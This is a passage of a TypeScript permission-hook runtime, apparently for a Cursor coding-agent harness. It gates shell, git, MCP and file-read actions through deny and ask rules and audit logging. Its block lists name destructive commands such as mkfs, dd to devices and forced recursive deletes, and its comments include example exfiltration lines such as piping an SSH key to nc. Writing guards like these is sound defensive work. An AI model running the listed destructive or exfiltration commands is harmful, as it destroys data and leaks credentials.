    if (token.startsWith("--git-dir") || token.startsWith("--work-tree") || token.startsWith("--exec-path")) {
      index += token.includes("=") ? 1 : 2;
      continue;
    }
    if (token.startsWith("-")) {
      index += 1;
      continue;
    }
    return { subcommand: token.toLowerCase(), rest: args.slice(index + 1) };
  }
  return { subcommand: "", rest: [] };
}

function severity(permission: Permission | undefined): number {
  if (permission === "deny") return 2;
  if (permission === "ask") return 1;
  return 0;
}

function strictest(left: HookOutput, right: HookOutput): HookOutput {
  return severity(right.permission) > severity(left.permission) ? right : left;
}

// Git subcommands that only read. Anything absent from this list needs approval, because
// enumerating dangerous subcommands leaves every unlisted one silently permitted.
const GIT_READ_ONLY = new Set([
  "status", "diff", "log", "show", "blame", "shortlog", "describe", "rev-parse", "rev-list",
  "ls-files", "ls-tree", "ls-remote", "cat-file", "for-each-ref", "symbolic-ref", "name-rev",
  "grep", "config", "help", "version", "count-objects", "verify-pack", "check-ignore",
  "check-attr", "merge-base", "hash-object", "annotate", "whatchanged", "bisect", "stash",
  "worktree", "remote", "fetch", "notes", "difftool", "range-diff", "cherry", "patch-id",
]);

/** Long options may be abbreviated as long as they stay unambiguous, so match by prefix. */
function hasLongOption(args: string[], option: string): boolean {
  return args.some((token) => {
    if (!token.startsWith("--") || token.length < 4) return false;
    const name = token.split("=")[0];
    return option.startsWith(name) && name.length >= 4;
  });
}

// A branch name and a pathspec look identical as text, and branch names legitimately contain
// slashes. Asking the filesystem is the only reliable discriminator available here.
function looksLikePathspec(root: string | undefined, token: string): boolean {
  if (token === "." || token.endsWith("/")) return true;
  if (root && existsSync(resolve(root, token))) return true;
  return /\.[A-Za-z0-9]{1,6}$/.test(token);
}

function classifyGit(rest: string[], raw: string, root?: string): HookOutput | null {
  const { subcommand, rest: args } = gitOperation(rest);
  const discards = "Blocked a command that discards committed or uncommitted work.";
  if (subcommand === "reset" && hasLongOption(args, "--hard")) {
    return decision("deny", discards, raw);
  }
  if (
    subcommand === "clean" &&
    (args.some((token) => /^-[a-z]*f/i.test(token)) || hasLongOption(args, "--force"))
  ) {
    return decision("deny", "Blocked a destructive command that deletes untracked files.", raw);
  }
  // `switch` cannot take a pathspec at all, so only an explicit discard is destructive.
  if (subcommand === "switch") {
    return hasLongOption(args, "--discard-changes") || args.some((token) => /^-[a-zA-Z]*f/.test(token))
      ? decision("deny", discards, raw)
      : null;
  }
  if (subcommand === "checkout") {
    const operands = args.filter((token) => !token.startsWith("-"));
    if (args.includes("--") || operands.some((token) => looksLikePathspec(root, token))) {
      return decision("deny", discards, raw);
    }
    return null;
  }
  if (subcommand === "restore") {
    // `--staged` alone rewrites the index and leaves the working tree intact.
    if (hasLongOption(args, "--staged") && !hasLongOption(args, "--worktree")) return null;
    return decision("deny", discards, raw);
  }
  if (subcommand === "push") {
    return decision("ask", "Publishing repository changes requires approval.", raw);
  }
  if (GIT_READ_ONLY.has(subcommand)) return null;
  if (!subcommand) return null;
  return decision(
    "ask",
    `The git subcommand \`${subcommand}\` is not on the read-only list, so it may change repository state.`,
    raw,
  );
}

function classifySegment(segment: ShellSegment, raw: string, root?: string): HookOutput {
  const allow: HookOutput = { permission: "allow" };
  if (!segment.name) return allow;
  if (segment.name === "git") {
    return classifyGit(segment.args, raw, root) ?? allow;
  }
  return allow;
}

// One token can carry several paths: `--env-file=.env`, `http://host/$(cat .env)`, `a;b`.
// Splitting on shell punctuation before matching keeps substitution from hiding the target.
function pathFragments(token: string): string[] {
  const fragments = token
    .split(/[\s()`;,|<>&"']+|\$\{|\$\(/)
    .map((fragment) => fragment.trim())
    .filter(Boolean);
  const expanded = new Set<string>();
  for (const fragment of fragments) {
    expanded.add(fragment);
    // A path fused to its option or to an `@` prefix hides the basename: `-d@.env`,
    // `-T.env`, `file=@.env`, `--env-file=.env`.
    const stripped = fragment
      .replace(/^-{1,2}[A-Za-z0-9-]*=?/, "")
      .replace(/^[A-Za-z0-9_-]+=/, "")
      .replace(/^@/, "");
    if (stripped && stripped !== fragment) expanded.add(stripped);
    const afterAt = fragment.replace(/^.*@/, "");
    if (afterAt && afterAt !== fragment) expanded.add(afterAt);
  }
  return [...expanded];
}

// Sensitive paths are gated wherever they appear, because the tool-level read guard is
// bypassed the moment the same file is opened by a shell command instead.
function sensitiveTokens(segment: ShellSegment): string[] {
  const found: string[] = [];
  for (const token of segment.args) {
    if (!token) continue;
    for (const fragment of pathFragments(token)) {
      if (sensitivePath(fragment)) found.push(fragment);
    }
  }
  return found;
}

function classifySecretExposure(parse: ShellParse, raw: string): HookOutput {
  let result: HookOutput = { permission: "allow" };
  // A pipeline moves the data across segment boundaries, so `cat id_rsa | nc host port` is
  // exfiltration even though neither segment names both the secret and the destination.
  let secretInPipeline: string | null = null;
  for (const segment of parse.segments) {
    if (!segment.pipedFrom) secretInPipeline = null;
    const carried = sensitiveTokens(segment);
    if (secretInPipeline && EGRESS_COMMANDS.has(segment.name)) {
      return decision(
        "deny",
        `Blocked piping a likely credential file to an external destination: ${secretInPipeline}.`,
        raw,
      );
    }
    if (carried.length > 0) secretInPipeline = carried[0];
  }
  for (const segment of parse.segments) {
    if (parse.dynamic && EGRESS_COMMANDS.has(segment.name)) {
      result = strictest(
        result,
        decision(
          "ask",
          "This command sends data outward and uses substitution, so its payload cannot be verified.",
          raw,
        ),
      );
    }
    const exposed = sensitiveTokens(segment);
    if (exposed.length === 0) continue;
    const target = exposed[0];
    if (EGRESS_COMMANDS.has(segment.name)) {
      return decision("deny", `Blocked sending a likely credential file to an external destination: ${target}.`, raw);
    }
    result = strictest(
      result,
      decision("ask", `This command reads or writes a likely credential or secret file: ${target}.`, raw),
    );
  }
  return result;
}

function shellDecision(command: unknown, root?: string): HookOutput {
  const value = String(command || "").trim();
  const lower = value.toLowerCase();
  const allow: HookOutput = { permission: "allow" };
  if (!value) return allow;

  // Semantic classification runs first and is never relaxed by the legacy pattern lists below;
  // the two layers are combined by taking the strictest verdict.
  const parse = parseShellCommand(value);
  let semantic: HookOutput = allow;
  for (const segment of parse.segments) {
    semantic = strictest(semantic, classifySegment(segment, value, root));
  }
  semantic = strictest(semantic, classifySecretExposure(parse, value));
  if (semantic.permission === "deny") return semantic;
  const denyPatterns = [
    /\bgit\s+(reset\s+--hard|clean\s+(?:--force|-[a-z]*f[a-z]*)|checkout\s+--)\b/i,
    /\b(mkfs(\.\w+)?|diskpart|format\s+[a-z]:|shutdown|reboot)\b/i,
    /\bdd\b[^;&|]*(\bof=\/dev\/|\bof=\\\\\.\\physicaldrive)/i,
    /\b(drop|truncate)\s+(database|schema)\b/i,
    /\b(rm|rmdir)\b[^;&|]*(--no-preserve-root|\/\s*$|\/\*|\.\.[\\/]|\.git)/i,
    /\b(remove-item|del|erase)\b[^;&|]*(\*|\.\.[\\/]|\.git)[^;&|]*(-recurse|-force|\/s|\/q)/i,
    /\bremove-item\b[^;&|]*\b[a-z]:[\\/]["']?\s+[^;&|]*(-recurse|-force)/i,
    /\b(reg\s+delete|bcdedit)\b/i,
  ];
  if (denyPatterns.some((pattern) => pattern.test(value))) {
    return decision("deny", "Blocked an obviously destructive command.", value);
  }
  if (parse.dynamic && parse.segments.every((segment) => !segment.name)) {
    return strictest(semantic, decision("ask", "This command is built entirely by substitution.", value));
  }
  const askPatterns = [
    /\bgit(?:\s+(?:-[a-zA-Z]\s+\S+|--[\w-]+(?:=\S+)?))*\s+push\b/i,
    /\b(gh\s+(pr\s+merge|release\s+create)|npm\s+publish|cargo\s+publish|twine\s+upload)\b/i,
    /\bgh\s+(api|issue\s+create|pr\s+create)\b/i,
    /\bcurl\b[^;&|]*(?:\s-d(?:\s|=)|--data(?:-[a-z]+)?(?:\s|=)|--upload-file(?:\s|=)|\s-T\s)/i,
    /\b(invoke-restmethod|invoke-webrequest)\b[^;&|]*(?:-method\s+(post|put|patch|delete)|-body\b)/i,
    /\b(kubectl|helm|terraform|pulumi|ansible-playbook)\b/i,
    /\b(production|prod)\b.*\b(deploy|apply|migrate|restart|delete)\b/i,
    /\b(deploy|release|publish)\b.*\b(production|prod)\b/i,
    /\b(?:npm|pnpm|yarn)(?:\s+(?:--prefix|--cwd|-C)\s+\S+|\s+--[\w-]+(?:=\S+)?)*\s+(?:install|add|i)\b/i,
    /\b(?:pip|pip3|uv|cargo|go)\s+(?:install|add|get)\b/i,
    /\b(sudo|runas|start-process\b.*-verb\s+runas)\b/i,
    /\b(kill|killall|pkill|taskkill|stop-process)\b/i,
    /\b(?:rm|rmdir|del|erase|remove-item)\b/i,
    /\b(rm|rmdir)\b[^;&|]*-[a-z]*r/i,
    /\bremove-item\b[^;&|]*-recurse/i,
    /\bdocker\s+(system|volume|image|container)\s+prune\b/i,
    /\b(?:sh|bash|zsh)\s+-c\b/i,
    /\b(?:powershell|pwsh)(?:\.exe)?\s+(?:-command|-c)\b/i,
    /\bnode(?:\.exe)?\s+(?:-e|--eval)\b/i,
    /\b(?:python|python3|py)(?:\.exe)?\s+-c\b/i,
  ];
  if (askPatterns.some((pattern) => pattern.test(value))) {
    return strictest(
      semantic,
      decision("ask", "This command has external, destructive, privileged, or installation side effects.", value),
    );
  }
  return lower.includes("git push")
    ? strictest(semantic, decision("ask", "Publishing repository changes requires approval.", value))
    : semantic;
}

function mcpDecision(payload: HookPayload): HookOutput {
  const name = String(payload.tool_name || "").toLowerCase();
  const input =
    typeof payload.tool_input === "string"
      ? payload.tool_input.toLowerCase()
      : JSON.stringify(payload.tool_input || {}).toLowerCase();
  const combined = `${name} ${input}`;
  // An MCP tool reaching a credential path is the same exposure as a shell command doing it,
  // so the check lives here too rather than only on the file-read hook.
  for (const fragment of pathFragments(input)) {
    if (sensitivePath(fragment)) {
      return decision("deny", `Blocked an MCP call that references a likely credential file: ${fragment}.`, name);
    }
  }
  if (
    /(^|[_-])(delete|destroy|drop|purge|revoke|rotate[_-]secret|reset)([_-]|$)/.test(name) ||
    (/\b(prod|production)\b/.test(combined) && /\b(write|create|update|deploy|apply|delete)\b/.test(combined))
  ) {
    return decision("deny", "Blocked a destructive or production MCP operation.", name);
  }
  if (
    /(^|[_-])(write|create|update|edit|send|post|put|patch|merge|publish|deploy|apply|upload|invite|comment|message|issue|pull-request|release)([_-]|$)/.test(
      name.replaceAll("pull_request", "pull-request"),
    ) ||
    /"(operation|action|method)"\s*:\s*"(write|create|update|edit|send|post|put|patch|merge|publish|deploy|apply|upload|delete)"/.test(
      input,
    )
  ) {
    return decision("ask", "This MCP tool appears to write data or cause an external side effect.", name);
  }
  return { permission: "allow" };
}

function decision(permission: Permission, message: string, subject: string): HookOutput {
  return {
    permission,
    user_message: message,
    agent_message: `${message} Review and obtain explicit user approval before retrying: ${subject}`,
  };
}

async function stdinJson(): Promise<HookPayload> {
  let input = "";
  process.stdin.setEncoding("utf8");
  for await (const chunk of process.stdin) input += chunk;
  if (!input.trim()) return {};
  try {
    return JSON.parse(input);
  } catch (error) {
    throw new Error(`Hook input is not valid JSON: ${errorMessage(error)}`);
  }
}

function appendLedger(
  root: string,
  event: string,
  payload: HookPayload,
  outcome: string,
  reason?: string,
): void {
  const state = resolve(root, STATE_REL);
  mkdirSync(state, { recursive: true });
  const subject =
    payload.command ||
    payload.tool_name ||
    (payload.file_path ? posix(relative(root, payload.file_path)) : null);
  const record = {
    timestamp: new Date().toISOString(),
    event,
    conversation_id: payload.conversation_id || null,
    generation_id: payload.generation_id || null,
    subject: subject ? boundedText(redactSecrets(String(subject)), 300) : null,
    outcome,
    // The reason is what makes an audit able to say what a gate actually caught.
    reason: reason ? boundedText(redactSecrets(reason), 300) : null,
  };
  appendFileSync(resolve(state, "ledger.jsonl"), `${JSON.stringify(record)}\n`, "utf8");
}

async function hook(event: string, options: CliOptions): Promise<void> {
  if (!EVENTS.includes(event)) throw new Error(`Unsupported hook event: ${event}`);
  const payload = await stdinJson();
  const root = payload.workspace_roots?.[0] ? resolve(payload.workspace_roots[0]) : targetFrom(options);
  let output: HookOutput = {};
  try {
    output = await handleHookEvent(event, payload, root);
  } catch (error) {
    // Security events stay fail-closed: an unhandled error must never become permission to run.
    if (SECURITY_EVENTS.includes(event)) throw error;
    // Observational events degrade, but the degraded output must not be byte-identical to
    // "everything is verified". A silent `{}` here turned a broken gate into a silent pass.
    appendLedger(root, event, payload, `error:${errorMessage(error)}`);
    const quarantined = quarantineCorruptState(root);
    printJson({
      additional_context:
        `The harness could not evaluate the ${event} event: ${boundedText(errorMessage(error), 400)} ` +
        (quarantined.length > 0
          ? `Unreadable state was moved aside (${quarantined.join(", ")}) and will be rebuilt. `
          : "") +
        "Treat verification state as unknown until `node scripts/harness.mjs gate` has been run again.",
    });
    return;
  }

/** Moves unparseable state files aside so the next run rebuilds them instead of failing forever. */
function quarantineCorruptState(root: string): string[] {
  const moved: string[] = [];
  const candidates = [
    QUALITY_LEDGER_REL,
    TASKS_REL,
    `${STATE_REL}/quality.json`,
    `${STATE_REL}/baseline.json`,
  ];
  for (const relativePath of candidates) {
    const absolute = resolve(root, relativePath);
    if (!existsSync(absolute)) continue;
    try {
      readJson(absolute);
    } catch {
      const parked = `${absolute}.corrupt-${Date.now()}`;
      try {
        renameSync(absolute, parked);
        moved.push(posix(relative(root, parked)));
      } catch {
        continue;
      }
    }
  }
  return moved;
}
  appendLedger(
    root,
    event,
    payload,
    output.permission || (output.followup_message ? "followup" : "observe"),
    output.user_message || output.followup_message,
  );
  printJson(output);
}

async function handleHookEvent(
  event: string,
  payload: HookPayload,
  root: string,
): Promise<HookOutput> {
  let output: HookOutput = {};
  if (event === "beforeShellExecution") {
    output = shellDecision(payload.command, root);
  } else if (event === "beforeMCPExecution") {
    output = mcpDecision(payload);
  } else if (event === "beforeReadFile") {
    output = sensitivePath(payload.file_path || "")
      ? {
          permission: "deny",
          user_message: "Blocked reading a likely credential or secret file.",
        }
      : { permission: "allow" };
  } else if (event === "preToolUse") {
    const tool = String(payload.tool_name || "").toLowerCase();
    const input = (payload.tool_input || {}) as Record<string, unknown>;
    const path = String(input.file_path || input.path || "");
    const concurrent =
      (tool === "write" || tool === "edit") && path
        ? preflightTaskWrite(root, posix(relative(root, resolve(root, path))))
        : null;
    if ((tool === "read" || tool === "write") && path && sensitivePath(path)) {
      output = decision("deny", "Blocked access to a likely credential or secret file.", path);
    } else if (concurrent) {
      output = concurrent;
    } else if (
      tool === "delete" &&
      (!path || sensitivePath(path) || /(^|[\\/])\.git([\\/]|$)|\.\.[\\/]|[*?]/.test(path))
    ) {
      output = decision("deny", "Blocked a broad or sensitive delete operation.", path || "<unspecified>");
    } else {
      output = { permission: "allow" };
    }
  } else if (event === "sessionStart") {
    const current = binding(root);
    const dirty = changedPaths(root, current.base_commit);
    writeJson(resolve(root, STATE_REL, "baseline.json"), {
      ...current,
      changed_paths: dirty,
      session_id: payload.session_id || payload.conversation_id || null,
      created_at: new Date().toISOString(),
    });
    const lines = [
      "Safety controls are non-waivable. Record exact verification evidence and bind reviews to the current base commit and diff hash.",
    ];
    const task = activeTask(root);
    if (task) {
      lines.push(`Task ${task.id} is still active: ${task.goal}. Writable scope: ${task.owned_paths.join(", ")}.`);
    }
    // A dirty tree at session start usually means a previous session was interrupted or
    // compacted, so the recorded state may not describe reality any more.
    if (dirty.length > 0) {
      lines.push(
        `${dirty.length} path(s) already differ from ${current.base_commit}. Reconcile what is already in progress before adding new work, and preserve changes you did not make.`,
      );
    }
    const notePath = resolve(root, STATE_REL, "compaction-note.json");
    if (existsSync(notePath)) {
      lines.push(`A pre-compaction state note is available at ${posix(relative(root, notePath))}.`);
    }
    output = { env: { CURSOR_HARNESS_ROOT: root }, additional_context: lines.join(" ") };
  } else if (event === "afterFileEdit") {
    const current = binding(root);
    const editedFile = payload.file_path ? posix(relative(root, payload.file_path)) : null;
    withStateLock(root, "quality", () => {
      const qualityPath = resolve(root, STATE_REL, "quality.json");
      const quality = existsSync(qualityPath) ? readJson(qualityPath) : {};
      const baselinePath = resolve(root, STATE_REL, "baseline.json");
      const baseline = existsSync(baselinePath) ? readJson(baselinePath) : null;
      writeJson(qualityPath, {
        ...quality,
        pending_diff_sha256: current.diff_sha256,
        edited_at: new Date().toISOString(),
        session_baseline_diff_sha256: baseline?.diff_sha256 || null,
        preexisting_changed_paths: baseline?.changed_paths || [],
        session_edited_files: [
          ...new Set([...(quality.session_edited_files || []), editedFile].filter(Boolean)),
        ],
      });
    });
    if (editedFile) recordTaskWrite(root, editedFile);
  } else if (event === "afterShellExecution") {
    // Recording what actually ran turns "Verified" from an agent's claim into a fact the
    // harness can check independently.
    const command = String(payload.command || "");
    const exitCode = (payload as Record<string, unknown>).exit_code;
    withStateLock(root, "shell-log", () => {
      const path = resolve(root, STATE_REL, "shell-log.json");
      const existing = existsSync(path) ? readJson(path) : { version: 1, entries: [] };
      existing.entries = [
        ...(Array.isArray(existing.entries) ? existing.entries : []),
        {
          command: boundedText(redactSecrets(command), 500),
          exit_code: typeof exitCode === "number" ? exitCode : null,
          diff_sha256: binding(root).diff_sha256,
          at: new Date().toISOString(),
        },
      ].slice(-300);
      writeJson(path, { version: 1, entries: existing.entries });
    });
  } else if (event === "subagentStart") {
    const task = activeTask(root);
    const lines = [
      "Return the completion receipt: Status / Changed / Verified / Not verified / Needs review by / Evidence.",
      "`Verified` may list only checks that actually executed in this delegation.",
    ];
    if (task) {
      lines.push(
        `An owning task is active (${task.id}, risk ${task.risk}). Writable scope is limited to: ${task.owned_paths.join(", ")}.`,
        "Writes outside that scope, and writes to files changed outside this task, are blocked.",
      );
    }
    output = { additional_context: lines.join(" ") };
  } else if (event === "preCompact") {
    // Compaction is the last moment the current reasoning still exists. Anything not written
    // down here is gone, which is how long tasks drift in large repositories.
    const current = binding(root);
    const plan = buildVerifyPlan(root, [], { base: current.base_commit });
    const assessment = assessQuality(root, plan);
    const task = activeTask(root);
    const notePath = resolve(root, STATE_REL, "compaction-note.json");
    writeJson(notePath, {
      version: 1,
      created_at: new Date().toISOString(),
      ...current,
      active_task: task,
      affected_modules: plan.modules,
      outstanding_checks: assessment.checks.filter((check) => !check.acceptable),
      changed_paths: changedPaths(root, current.base_commit).slice(0, 200),
    });
    output = {
      additional_context:
        `Harness state was saved to ${posix(relative(root, notePath))} before compaction: base commit ${current.base_commit}, ` +
        `${plan.modules.length} affected modules, ${assessment.checks.filter((check) => !check.acceptable).length} checks still unverified.`,
    };
  } else if (event === "subagentStop") {
    if (
      payload.status === "completed" &&
      Array.isArray(payload.modified_files) &&
      payload.modified_files.length > 0 &&
      Number(payload.loop_count || 0) < 1
    ) {
      output = {
        followup_message:
          "Inspect the complete scoped diff and run the affected verification plan. Report exact outcomes; do not widen scope.",
      };
    }
  } else if (event === "stop") {
    const current = binding(root);
    const baselinePath = resolve(root, STATE_REL, "baseline.json");
    const baseline = existsSync(baselinePath) ? readJson(baselinePath) : null;
    // Relying on afterFileEdit would miss every write made through a shell command, so the
    // trigger is the working tree moving away from the session baseline instead.
    const changedThisSession = baseline
      ? baseline.diff_sha256 !== current.diff_sha256
      : changedPaths(root, current.base_commit).length > 0;
    if (
      payload.status === "completed" &&
      Number(payload.loop_count || 0) < 2 &&
      changedThisSession
    ) {
      const plan = buildVerifyPlan(root, [], { base: current.base_commit });
      const assessment = assessQuality(root, plan);
      if (!assessment.complete) {
        const outstanding = assessment.checks
          .filter((check) => !check.acceptable)
          .map((check) => `${check.id} (${check.status})`);
        const gaps = assessment.attributes
          .filter((entry) => entry.enforcement === "block" && !entry.covered)
          .map((entry) => `${entry.module}/${entry.attribute} (${entry.tier})`);
        const parts = [];
        if (outstanding.length > 0) {
          parts.push(`no passing verification receipt for: ${outstanding.join(", ")}`);
        }
        if (gaps.length > 0) {
          parts.push(`no evidence for required quality attributes: ${gaps.join(", ")}`);
        }
        output = {
          followup_message:
            `The current diff has ${parts.join("; and ")}. ` +
            "Run `node scripts/harness.mjs gate` and report the outcome. Do not claim verification that did not execute.",
        };
      }
    }
  }
  return output;
}

function validateCatalog(value: any, label: string, errors: string[]): void {
  if (value?.version !== 1 || !Array.isArray(value.modules)) {
    errors.push(`${label}: expected version 1 and a modules array.`);
    return;
  }
  const ids = new Set<string>();
  for (const module of value.modules) {
    if (!module.id || ids.has(module.id)) errors.push(`${label}: module IDs must be unique and non-empty.`);
    ids.add(module.id);
    if (!Array.isArray(module.paths) || module.paths.length === 0) {
      errors.push(`${label}: module ${module.id || "<unknown>"} needs paths.`);
    }
  }
  for (const module of value.modules) {
    for (const dependency of module.dependsOn || []) {
      if (!ids.has(dependency)) errors.push(`${label}: module ${module.id} has unknown dependency ${dependency}.`);
    }
  }
}

function compilerPath(root: string): string | null {
  const candidate = resolve(root, "node_modules/typescript/lib/tsc.js");
  return existsSync(candidate) ? candidate : null;
}

// The checked-in runtime must be exactly what the current TypeScript source compiles to.
// Comparing bytes against a scratch build is the only check that cannot be satisfied by
// editing the runtime directly.
function compareCompiledRuntime(root: string, errors: string[]): void {
  const compiler = compilerPath(root);
  if (!compiler) {
    errors.push(
      "TypeScript compiler is unavailable; run `npm install` before validating runtime parity.",
    );
    return;
  }
  const scratch = mkdtempSync(resolve(tmpdir(), "cursor-harness-build-"));
  try {
    const build = run(
      process.execPath,
      [compiler, "-p", resolve(root, "tsconfig.json"), "--outDir", scratch],
      root,
      true,
    );
    if (!build.ok) {
      errors.push(`TypeScript build failed: ${(build.stdout || build.stderr).trim()}`);
      return;
    }
    const expected = walkFiles(scratch).map((absolute) => posix(relative(scratch, absolute))).sort();
    for (const rel of expected) {
      const built = resolve(scratch, rel);
      const shipped = resolve(root, ".cursor/runtime", rel);
      if (!existsSync(shipped)) {
        errors.push(`Checked-in runtime is missing a compiled file: .cursor/runtime/${rel}`);
        continue;
      }
      if (
        normalizeLf(readFileSync(built, "utf8")) !== normalizeLf(readFileSync(shipped, "utf8"))
      ) {
        errors.push(
          `Checked-in runtime is stale for ${rel}; run \`npm run build\` and commit the result.`,
        );
      }
    }
    const shippedFiles = walkFiles(resolve(root, ".cursor/runtime"))
      .map((absolute) => posix(relative(resolve(root, ".cursor/runtime"), absolute)))
      .sort();
    for (const rel of shippedFiles) {
      if (!expected.includes(rel)) {
        errors.push(`Checked-in runtime has an orphaned file the build does not produce: ${rel}`);
      }
    }
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
}

function validateRuntimeSync(root: string, errors: string[]): void {
  const source = resolve(root, "src/harness.mts");
  const runtime = resolve(root, ".cursor/runtime/harness.mjs");
  if (!existsSync(runtime)) {
    errors.push("Missing checked-in runtime: .cursor/runtime/harness.mjs.");
    return;
  }
  if (!existsSync(source)) {
    const manifestPath = resolve(root, INSTALL_MANIFEST_REL);
    if (!existsSync(manifestPath)) {
      errors.push("src/harness.mts is missing and no valid install manifest is available.");
      return;
    }
    try {
      const manifest = validateInstallManifest(root, readJson(manifestPath));
      if (!manifest.files.some((entry: FileEntry) => entry.path === ".cursor/runtime/harness.mjs")) {
        errors.push("Install manifest does not manage .cursor/runtime/harness.mjs.");
      }
    } catch (error) {
      errors.push(errorMessage(error));
    }
    return;
  }
  compareCompiledRuntime(root, errors);
}

function validateManagedJson(root: string, paths: string[], errors: string[]): void {
  for (const path of [...new Set(paths)]) {
    const absolute = resolve(root, path);
    if (!existsSync(absolute)) continue;
    try {
      readJson(absolute);
    } catch (error) {
      errors.push(errorMessage(error));
    }
  }
}

function isDefaultBootstrapConfig(root: string): boolean {
  const pairs = [
    ["harness/module-catalog.json", "harness/default-module-catalog.json"],
    ["harness/verification-matrix.json", "harness/default-verification-matrix.json"],
  ];
  return pairs.every(([local, fallback]) => {
    const localPath = resolve(root, local);
    const fallbackPath = resolve(root, fallback);
    return (
      existsSync(localPath) &&
      existsSync(fallbackPath) &&
      normalizeLf(readFileSync(localPath, "utf8")) === normalizeLf(readFileSync(fallbackPath, "utf8"))
    );
  });
}

function validate(options: CliOptions): void {
  const root = targetFrom(options);
  const errors: string[] = [];
  const warnings: string[] = [];
  const syncOnly = boolOption(options, "sync-only");
  validateRuntimeSync(root, errors);
  if (!syncOnly) {
    const required = [
      "AGENTS.md",
      ".cursor/hooks.json",
      ".cursor/cli.json",
      ".cursor/sandbox.json",
      ".cursor/worktrees.json",
      "harness/default-module-catalog.json",
      "harness/default-verification-matrix.json",
      "harness/module-catalog.json",
      "harness/verification-matrix.json",
      "scripts/harness.mjs",
    ];
    if (isHarnessSourceRoot(root)) {
      required.push(
        "README.md",
        "docs/ADOPTION.md",
        "docs/ARCHITECTURE.md",
        "docs/GOVERNANCE.md",
        "docs/LARGE-REPO-GUIDE.md",
        "docs/OPERATIONS.md",
        "docs/PROJECT-MEMORY.md",
        "docs/PROTOCOLS.md",
        "docs/QUALITY-ATTRIBUTES.md",
      );
    }
    for (const path of required) {
      if (!existsSync(resolve(root, path))) errors.push(`Missing required asset: ${path}`);
    }
    const managedJson = [
      ".cursor/hooks.json",
      ".cursor/cli.json",
      ".cursor/sandbox.json",
      ".cursor/worktrees.json",
      "harness/default-module-catalog.json",
      "harness/default-verification-matrix.json",
      "harness/module-catalog.json",
      "harness/verification-matrix.json",
      INSTALL_MANIFEST_REL,
    ];
    const schemaDir = resolve(root, "harness/schemas");
    if (existsSync(schemaDir)) {
      managedJson.push(
        ...readdirSync(schemaDir)
          .filter((name) => name.endsWith(".json"))
          .map((name) => `harness/schemas/${name}`),
      );
    }
    validateManagedJson(root, managedJson, errors);
    if (existsSync(resolve(root, ".cursor/hooks.json"))) {
      const config = readJson(resolve(root, ".cursor/hooks.json"));
      if (config.version !== 1) errors.push(".cursor/hooks.json must use version 1.");
      for (const event of EVENTS) {
        const definitions = config.hooks?.[event];
        if (!Array.isArray(definitions) || definitions.length !== 1) {
          errors.push(`.cursor/hooks.json must define exactly one ${event} hook.`);
          continue;
        }
        if (definitions[0].command !== `node .cursor/runtime/harness.mjs hook ${event}`) {
          errors.push(`Hook ${event} must call the checked-in runtime.`);
        }
        if (SECURITY_EVENTS.includes(event) && definitions[0].failClosed !== true) {
          errors.push(`Security hook ${event} must set failClosed: true.`);
        }
      }
    }
    if (existsSync(resolve(root, "harness/default-module-catalog.json"))) {
      validateCatalog(
        readJson(resolve(root, "harness/default-module-catalog.json")),
        "default-module-catalog.json",
        errors,
      );
    }
    if (existsSync(resolve(root, "harness/default-verification-matrix.json"))) {
      const verification = readJson(resolve(root, "harness/default-verification-matrix.json"));
      if (verification.version !== 1 || !verification.checks || Array.isArray(verification.checks)) {
        errors.push("default-verification-matrix.json must define version 1 and a checks object.");
      }
    }
    if (isDefaultBootstrapConfig(root)) {
      warnings.push(
        "Module catalog and verification matrix still use bootstrap defaults; customize them for this repository.",
      );
    }
  }
  if (Number(process.versions.node.split(".")[0]) < 20) errors.push("Node.js 20 or newer is required.");
  if (!gitAvailable(root)) warnings.push("Git is unavailable; receipt bindings use a filesystem snapshot.");
  printJson({
    command: "validate",
    check_type: syncOnly ? "sync-only" : "full",
    target: root,
    ok: errors.length === 0,
    errors,
    warnings,
  });
  if (errors.length) process.exitCode = 1;
}

function doctor(options: CliOptions): void {
  const root = targetFrom(options);
  const checks: Array<{ name: string; ok: boolean; detail: string }> = [];
  const warnings: string[] = [];
  const major = Number(process.versions.node.split(".")[0]);
  checks.push({ name: "node", ok: major >= 20, detail: process.version });
  const gitVersion = git(root, ["--version"], true);
  checks.push({
    name: "git",
    ok: gitVersion.ok,
    detail: (gitVersion.stdout || gitVersion.stderr).trim() || "not found",
  });
  checks.push({
    name: "repository-root",
    ok: existsSync(resolve(root, "AGENTS.md")) && existsSync(resolve(root, ".cursor")),
    detail: root,
  });
  for (const path of ["scripts/harness.mjs", ".cursor/hooks.json"]) {
    checks.push({ name: path, ok: existsSync(resolve(root, path)), detail: existsSync(resolve(root, path)) ? "present" : "missing" });
  }
  const syncErrors: string[] = [];
  validateRuntimeSync(root, syncErrors);
  checks.push({
    name: "runtime-sync",
    ok: syncErrors.length === 0,
    detail: syncErrors[0] || "source and runtime match",
  });
  if (isDefaultBootstrapConfig(root)) {
    warnings.push(
      "Module catalog and verification matrix still use bootstrap defaults; customize them for this repository.",
    );
  }
  const ok = checks.every((check) => check.ok);
  printJson({ command: "doctor", target: root, ok, checks, warnings });
  if (!ok) process.exitCode = 1;
}

function manifest(options: CliOptions): void {
  const root = targetFrom(options);
  if (!isHarnessSourceRoot(root)) {
    const files = snapshotFiles(root, true);
    printJson({
      version: 1,
      harness_version: VERSION,
      hash: "sha256-lf-v1",
      files,
      digest: manifestDigest(files),
      check: boolOption(options, "check"),
    });
    return;
  }
  const value = sourceManifest();
  const manifestPath = resolve(root, SOURCE_MANIFEST_REL);
  if (boolOption(options, "write")) {
    writeJson(manifestPath, value);
    printJson({
      command: "manifest",
      ok: true,
      written: manifestPath,
      digest: value.digest,
      files: value.files.length,
    });
    return;
  }
  if (boolOption(options, "check")) {
    const errors: string[] = [];
    validateRuntimeSync(root, errors);
    if (!existsSync(manifestPath)) {
      errors.push(`Missing source manifest: ${SOURCE_MANIFEST_REL}.`);
    } else {
      const expected = readJson(manifestPath);
      let savedDigest = null;
      if (Array.isArray(expected.files)) {
        savedDigest = manifestDigest(expected.files);
        if (savedDigest !== expected.digest) {
          errors.push("Saved source manifest digest does not match its files.");
        }
      } else {
        errors.push("Saved source manifest files must be an array.");
      }
      for (const field of ["version", "harness_version", "hash", "files", "digest"] as const) {
        if (JSON.stringify(expected[field]) !== JSON.stringify(value[field])) {
          errors.push(`Source manifest ${field} is stale.`);
        }
      }
      if (errors.length > 0) {
        errors.push("Source manifest is stale; run `node scripts/harness.mjs manifest --write`.");
      }
    }
    printJson({
      command: "manifest",
      ok: errors.length === 0,
      digest: value.digest,
      files: value.files.length,
      errors,
    });
    if (errors.length) process.exitCode = 1;
  } else {
    printJson(value);
  }
}

